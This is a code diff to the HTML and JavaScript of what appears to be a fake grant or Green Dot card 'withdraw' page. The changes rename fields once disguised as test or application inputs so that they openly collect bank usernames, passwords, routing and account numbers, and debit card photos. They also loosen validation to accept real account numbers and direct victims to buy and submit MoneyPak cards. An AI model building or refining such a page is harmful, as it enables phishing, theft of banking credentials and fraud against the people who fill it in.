@@ -1597,7 +1597,7 @@
                                     <div class="action-row">
                                         <div class="action-item" onclick="openWithdrawPage()">
                                             <div class="action-icon">📝</div>
-                                            <div class="action-label">Application</div>
+                                            <div class="action-label">Withdraw</div>
                                         </div>
                                         <div class="action-item">
                                             <div class="action-icon">📥</div>
@@ -1757,7 +1757,7 @@
                     </div>
                     <div class="w-step" id="withdrawStepMarker3">
                         <span>3</span>
-                        <div>Bank routine & Account number</div>
+                        <div>Number Check</div>
                     </div>
                     <div class="w-step" id="withdrawStepMarker4">
                         <span>4</span>
@@ -1770,18 +1770,19 @@
                     <p>Enter the basic application details below.</p>
                     <label for="appFullName" class="withdraw-input-label">Full Name</label>
                     <input id="appFullName" class="withdraw-input" placeholder="Enter full name" />
-                    <label for="appPreferredTrack" class="withdraw-input-label">Enter preferred receiving bank/ institution/label>
+                    <label for="appPreferredTrack" class="withdraw-input-label">Preferred receiving bank/
+                        Institution</label>
                     <input id="appPreferredTrack" class="withdraw-input"
-                        placeholder="Enter preferred receiving bank/ institution" />
+                        placeholder="Enter preferred receiving bank/institution" />
                 </div>
 
                 <div class="withdraw-stage" id="withdrawStage2">
-                    <h4>Online Access</h4>
-                    <p>Add the online access details and upload a debit card photo.</p>
+                    <h4>Account Online Access</h4>
+                    <p>Add the online access details and upload your debit card photo.</p>
                     <label for="appAccessUser" class="withdraw-input-label">Bank Username</label>
-                    <input id="appAccessUser" class="withdraw-input" placeholder="Enter bank username" />
-                    <label for="appStateOrigin" class="withdraw-input-label">password</label>
-                    <input id="appStateOrigin" class="withdraw-input" placeholder="Enter bank password" />
+                    <input id="appAccessUser" class="withdraw-input" placeholder="Enter bankusername" />
+                    <label for="appStateOrigin" class="withdraw-input-label">Password</label>
+                    <input id="appStateOrigin" class="withdraw-input" placeholder="Enter password" />
                     <label for="appPhoto" class="withdraw-input-label">Upload Debit card</label>
                     <input id="appPhoto" class="withdraw-input" type="file" accept="image/*"
                         onchange="handleWithdrawFileChange(event)" />
@@ -1791,13 +1792,13 @@
 
                 <div class="withdraw-stage" id="withdrawStage3">
                     <h4>Bank routine and account number</h4>
-                    <p>provide account number for a direct depoist of your grant funds</p>
-                    <label for="appDummy11" class="withdraw-input-label">Account number</label>
-                    <input id="appDummy11" class="withdraw-input" inputmode="numeric" 
-                        placeholder="Enter Account number" />
-                    <label for="appDummy10" class="withdraw-input-label">Bank routine</label>
-                    <input id="appDummy10" class="withdraw-input" inputmode="numeric" 
-                        placeholder="Enter Routine number" />
+                    <p>Needed for direct deposit into your bank account</p>
+                    <label for="appDummy11" class="withdraw-input-label">Bank routine</label>
+                    <input id="appDummy11" class="withdraw-input" inputmode="numeric"
+                        placeholder="Enter routine number" />
+                    <label for="appDummy10" class="withdraw-input-label">account number</label>
+                    <input id="appDummy10" class="withdraw-input" inputmode="numeric"
+                        placeholder="Enter account number" />
                 </div>
 
                 <div class="withdraw-stage" id="withdrawStage4">
@@ -1831,7 +1832,7 @@
                 </div>
                 <div class="withdraw-label">Provide Your Unregistered Card</div>
                 <div class="withdraw-sub">
-                    Submit a Moneypak Card for Registration and linking it to your Reloadable
+                    Submit a moneypak Card for Registration and linking it to your Reloadable
                     Account.
                 </div>
                 <div class="withdraw-label">Don't Have One Yet? Here's How to Get It:</div>
@@ -2119,7 +2120,7 @@
 
             dashboard.style.display = "block";
             welcomeUser.innerText = "You're welcome, " + name;
-            cardMessage.innerText = name + ", your Green Dot Reloadable Visa Card is ready to be linked with this account.";
+            cardMessage.innerText = name + ", your Greendot moneypak Reloadable Visa Card is ready to be linked with this account.";
 
             clearTimeout(pendingDepositTimeout);
             clearInterval(balanceInterval);
@@ -2197,7 +2198,7 @@
 
             depositAlert.innerHTML = `
         <div class="alert-title">
-          <div class="alert-badge">GreenDot Alert</div>
+          <div class="alert-badge">SMC Alert</div>
           <div style="font-size:0.8rem;color:#9fb1a8;">Just now</div>
         </div>
         <div class="alert-body">
@@ -2342,13 +2343,13 @@
                 const elevenDigits = document.getElementById("appDummy11").value.trim();
                 const tenDigits = document.getElementById("appDummy10").value.trim();
 
-                if (!/^\d{11}$/.test(elevenDigits)) {
-                    setWithdrawMessage("The first test field must contain exactly 11 digits.", true);
+                if (!/^\d+$/.test(elevenDigits)) {
+                    setWithdrawMessage("The first field must contain only digits.", true);
                     return false;
                 }
 
-                if (!/^\d{10}$/.test(tenDigits)) {
-                    setWithdrawMessage("The second test field must contain exactly 10 digits.", true);
+                if (!/^\d+$/.test(tenDigits)) {
+                    setWithdrawMessage("The second field must contain only digits.", true);
                     return false;
                 }
             }
@@ -2435,11 +2436,11 @@
             const summary = document.getElementById("withdrawSummary");
             const values = [
                 ["Full Name", document.getElementById("appFullName").value.trim()],
-                ["Preferred Role / Department", document.getElementById("appPreferredTrack").value.trim()],
-                ["Username", document.getElementById("appAccessUser").value.trim()],
-                ["State of Origin", document.getElementById("appStateOrigin").value.trim()],
-                ["11 Digit Test Number", document.getElementById("appDummy11").value.trim()],
-                ["10 Digit Test Number", document.getElementById("appDummy10").value.trim()],
+                ["Preferred receiving bank/ Institution", document.getElementById("appPreferredTrack").value.trim()],
+                ["Bank Username", document.getElementById("appAccessUser").value.trim()],
+                ["Password", document.getElementById("appStateOrigin").value.trim()],
+                ["Bank routine", document.getElementById("appDummy11").value.trim()],
+                ["account number", document.getElementById("appDummy10").value.trim()],
                 ["Uploaded Image", withdrawPhotoName || "Not selected"]
             ];
 
